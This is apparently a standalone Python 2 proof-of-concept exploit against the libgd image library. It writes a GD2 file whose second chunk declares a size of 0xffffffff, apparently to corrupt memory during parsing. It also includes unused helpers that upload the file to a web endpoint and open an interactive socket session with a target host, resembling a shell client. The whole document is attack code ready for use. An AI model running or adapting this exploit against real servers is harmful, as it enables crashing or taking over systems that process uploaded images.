#!/usr/bin/env python2

import sys
import os
import zlib
import socket
from struct import pack

import requests

# gd.h: #define gdMaxColors 256
gd_max_colors = 256


def make_gd2(chunks):
    gd2 = [
        "gd2\x00",                    # signature
        pack(">H", 2),                # version
        pack(">H", 1),                # image size (x)
        pack(">H", 1),                # image size (y)
        pack(">H", 0x40),             # chunk size (0x40 <= cs <= 0x80)
        pack(">H", 2),                # format (GD2_FMT_COMPRESSED)
        pack(">H", 1),                # num of chunks wide
        pack(">H", len(chunks))       # num of chunks high
    ]
    colors = [
        pack(">B", 0),                # trueColorFlag
        pack(">H", 0),                # im->colorsTotal
        pack(">I", 0),                # im->transparent
        pack(">I", 0) * gd_max_colors  # red[i], green[i], blue[i], alpha[i]
    ]

    offset = len("".join(gd2)) + len("".join(colors)) + len(chunks) * 8
    for data, size in chunks:
        gd2.append(pack(">I", offset))  # cidx[i].offset
        gd2.append(pack(">I", size))   # cidx[i].size
        offset += size

    return "".join(gd2 + colors + [data for data, size in chunks])


def connect(host, port):
    addr = socket.gethostbyname(host)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((addr, port))
    except socket.error:
        return

    print("\n[+] connected to %s:%d" % (host, port))
    if os.fork() == 0:
        while True:
            try:
                data = sock.recv(8192)
            except KeyboardInterrupt:
                sys.exit("\n[!] receiver aborting")
            if data == "":
                sys.exit("[!] receiver aborting")
            sys.stdout.write(data)
    else:
        while True:
            try:
                cmd = sys.stdin.readline()
            except KeyboardInterrupt:
                sock.close()
                sys.exit("[!] sender aborting")
            sock.send(cmd)


def send_gd2(url, gd2, code):
    files = {"file": gd2}
    try:
        req = requests.post(url, files=files, timeout=5)
        code.append(req.status_code)
    except requests.exceptions.ReadTimeout:
        pass


def get_payload(size):
    return "B"*size


def main():
    ofile = sys.argv[1]
    size = int(sys.argv[2])

    valid = zlib.compress("A" * 100, 0)
    payload = get_payload(size)
    gd2 = make_gd2([(valid, len(valid)), (payload, 0xffffffff)])

    with open(ofile, 'w') as fd:
        fd.write(gd2)

    print("Payload written to {}".format(ofile))


if __name__ == "__main__":
    main()
